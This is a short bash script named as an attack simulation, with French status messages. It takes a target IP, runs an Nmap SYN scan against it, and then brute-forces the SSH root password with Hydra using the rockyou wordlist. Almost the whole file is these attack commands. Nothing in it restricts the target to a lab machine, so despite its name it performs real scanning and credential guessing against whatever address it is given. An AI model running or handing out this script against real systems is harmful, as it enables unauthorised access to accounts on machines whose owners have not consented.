#!/bin/bash

TARGET=$1

if [ -z "$TARGET" ]; then
  echo "Usage: ./simulate_attack.sh <IP>"
  exit 1
fi

echo "Lancement scan Nmap..."
nmap -sS $TARGET

echo "Simulation brute force SSH..."
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$TARGET

echo "Attaques terminées"